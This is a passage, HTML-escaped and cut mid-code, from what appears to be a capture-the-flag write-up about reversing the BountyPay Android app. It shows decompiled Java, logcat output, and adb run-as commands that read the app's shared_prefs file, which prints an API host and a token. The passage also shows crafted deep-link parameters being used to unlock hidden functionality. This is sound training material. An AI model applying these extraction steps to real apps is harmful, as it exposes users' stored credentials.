class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e});\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003egetHost\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eSharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eEditor\u003c/span\u003e \u003cspan class=\"n\"\u003eeditor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetSharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;user_created\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eedit\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003echildRef\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eaddListenerForSingleValueEvent\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eValueEventListener\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonCancelled\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eDatabaseError\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1DatabaseError\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ee\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TAG\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;onCancelled\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eThrowable\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eparam1DatabaseError\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoException\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n        \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonDataChange\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eDataSnapshot\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1DataSnapshot\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eparam1DataSnapshot\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetValue\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n          \u003cspan class=\"n\"\u003eeditor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eputString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;HOST\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eapply\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e});\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003egetToken\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eSharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eEditor\u003c/span\u003e \u003cspan class=\"n\"\u003eeditor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetSharedPreferences\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;user_created\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eedit\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003echildRefTwo\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eaddListenerForSingleValueEvent\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eValueEventListener\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonCancelled\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eDatabaseError\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1DatabaseError\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ee\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TAG\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;onCancelled\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eThrowable\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eparam1DatabaseError\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoException\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n        \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonDataChange\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eDataSnapshot\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1DataSnapshot\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eparam1DataSnapshot\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetValue\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n          \u003cspan class=\"n\"\u003eeditor\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eputString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TOKEN\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eapply\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e});\u003c/span\u003e\n\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut that didn\u0026#39;t actually happen. Checking the app logs with \u003ccode\u003eadb logcat\u003c/code\u003e (or better - Android Studio provides a handy \u003ccode\u003eLogcat\u003c/code\u003e tool window) I noticed that it could not authenticate with Firebase:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebounty.pay W/DynamiteModule: Local module descriptor class for com.google.firebase.auth not found.\nbounty.pay W/GooglePlayServicesUtil: Google Play services out of date.  Requires 12451000 but found 11947470\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis was because I was running Android 7.1.1 Nougat in my emulator. I probably could have upgraded Google Play, but instead I just installed 9.0 Pie SDK and launched another device. Note: you need a device with Google Play pre-installed - only some are.\u003c/p\u003e\n\n\u003cp\u003eAfter re-doing all the steps, I saw in logcat that everything went smoothly:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebounty.pay I/TAG: Starting authentication\nbounty.pay D/TAG: signInAnonymously:success\nbounty.pay I/TAG: Getting host endpoint\nbounty.pay I/TAG: Getting Token\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can now retrieve the secret values from the local storage:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eadb shell\ngeneric_x86_arm:/ \u003cspan class=\"nv\"\u003e$ \u003c/span\u003erun-as bounty.pay\ngeneric_x86_arm:/data/data/bounty.pay \u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecd \u003c/span\u003eshared_prefs/\ngeneric_x86_arm:/data/data/bounty.pay/shared_prefs \u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecat \u003c/span\u003euser_created.xml\n\u0026lt;?xml \u003cspan class=\"nv\"\u003eversion\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1.0\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eencoding\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;utf-8\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003estandalone\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;yes\u0026#39;\u003c/span\u003e ?\u0026gt;\n\u0026lt;map\u0026gt;\n    \u0026lt;string \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;USERNAME\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003enirvana_msu\u0026lt;/string\u0026gt;\n    \u0026lt;string \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;PARTTWO\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003eCOMPLETE\u0026lt;/string\u0026gt;\n    \u0026lt;string \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;HOST\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003ehttp://api.bountypay.h1ctf.com\u0026lt;/string\u0026gt;\n    \u0026lt;string \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;PARTONE\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003eCOMPLETE\u0026lt;/string\u0026gt;\n    \u0026lt;string \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;TWITTERHANDLE\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003enirvana_msu\u0026lt;/string\u0026gt;\n    \u0026lt;string \u003cspan class=\"nv\"\u003ename\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;TOKEN\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e8e9998ee3137ca9ade8f372739f062c1\u0026lt;/string\u0026gt;\n\u0026lt;/map\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAt this stage we could have just moved on to the next part (back to web) of the CTF but I wanted to follow through the designed challenges to the end.\u003c/p\u003e\n\n\u003cp\u003eWe need to send another deep link. Relevant code from \u003ccode\u003ePartThreeActivity.java\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"nc\"\u003eUri\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003egetIntent\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetData\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003efirstParam\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;three\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003esecondParam\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;switch\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003ethirdParam\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetQueryParameter\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;header\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earrayOfByte2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earrayOfByte1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003edecodedFirstParam\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earrayOfByte2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eStandardCharsets\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eUTF_8\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003edecodedSecondParam\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earrayOfByte1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eStandardCharsets\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eUTF_8\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003echildRefThree\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eaddListenerForSingleValueEvent\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eValueEventListener\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonCancelled\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eDatabaseError\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1DatabaseError\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ee\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TAG\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;onCancelled\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eThrowable\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eparam1DatabaseError\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoException\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n        \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonDataChange\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eDataSnapshot\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1DataSnapshot\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003eparam1DataSnapshot\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetValue\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n          \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efirstParam\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003edecodedFirstParam\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;PartThreeActivity\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003esecondParam\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003edecodedSecondParam\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;on\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003ethirdParam\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr1\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n              \u003cspan class=\"nc\"\u003eStringBuilder\u003c/span\u003e \u003cspan class=\"n\"\u003estringBuilder\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eStringBuilder\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n              \u003cspan class=\"n\"\u003estringBuilder\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;X-\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n              \u003cspan class=\"n\"\u003estringBuilder\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n              \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr1\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estringBuilder\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e()))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003eeditText\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ebutton\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan 